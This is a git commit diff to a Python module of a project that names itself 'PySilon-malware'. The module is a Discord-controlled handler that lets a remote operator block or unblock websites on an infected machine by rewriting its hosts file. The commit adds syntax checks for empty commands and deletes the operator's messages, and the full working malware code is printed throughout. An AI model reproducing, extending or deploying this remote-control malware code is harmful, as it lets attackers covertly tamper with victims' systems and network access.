f9400852461d2dbc5a747f708e55a053c3016ef9
JuicyChann <nik.xeiladakis@gmail.com>
2023-09-24 22:56:34 +0300

    add check for empty arguments

--- resources/source_code/website_blocker.py
+++ resources/source_code/website_blocker.py
@@ -13,47 +13,59 @@ def get_hosts_file_path():
 
 # on message
 elif message.content[:9] == '.webblock':
-    website = message.content[10:]
-    await message.channel.send(website)
-
-    parsed_url = urlparse(website)
-    host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
-    hosts_file_path = get_hosts_file_path()
-
-    if hosts_file_path:
-        with open(hosts_file_path, 'a') as hosts_file:
-            hosts_file.write(host_entry)
-        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .unblock-website [websitename]```', colour=discord.Colour.green())
+    await message.delete()
+    if message.content.strip() == '.webblock':
+        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .webblock <https://example.com>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
-
     else:
-        embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await message.channel.send(embed=embed)
+        website = message.content[10:]
+        await message.channel.send(website)
+
+        parsed_url = urlparse(website)
+        host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
+        hosts_file_path = get_hosts_file_path()
+
+        if hosts_file_path:
+            with open(hosts_file_path, 'a') as hosts_file:
+                hosts_file.write(host_entry)
+            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .unblock-website [websitename]```', colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await message.channel.send(embed=embed)
+
+        else:
+            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await message.channel.send(embed=embed)
 
 elif message.content[:11] == '.webunblock':
-    website = message.content[12:]
-
-    website = website.replace("https://", "")
-    website = website.replace("http://", "")
-
-    hosts_file_path = get_hosts_file_path()
-
-    if hosts_file_path:
-        with open(hosts_file_path, 'r') as hosts_file:
-            lines = hosts_file.readlines()
-
-        filtered_lines = [line for line in lines if website not in line]
-
-        with open(hosts_file_path, 'w') as hosts_file:
-            hosts_file.writelines(filtered_lines)
-
-        embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
+    await message.delete()
+    if message.content.strip() == '.webunblock':
+        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .webunblock <example.com>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
-
     else:
-        embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
-        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        await message.channel.send(embed=embed)
+        website = message.content[12:]
+
+        website = website.replace("https://", "")
+        website = website.replace("http://", "")
+
+        hosts_file_path = get_hosts_file_path()
+
+        if hosts_file_path:
+            with open(hosts_file_path, 'r') as hosts_file:
+                lines = hosts_file.readlines()
+
+            filtered_lines = [line for line in lines if website not in line]
+
+            with open(hosts_file_path, 'w') as hosts_file:
+                hosts_file.writelines(filtered_lines)
+
+            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await message.channel.send(embed=embed)
+
+        else:
+            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
+            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+            await message.channel.send(embed=embed)
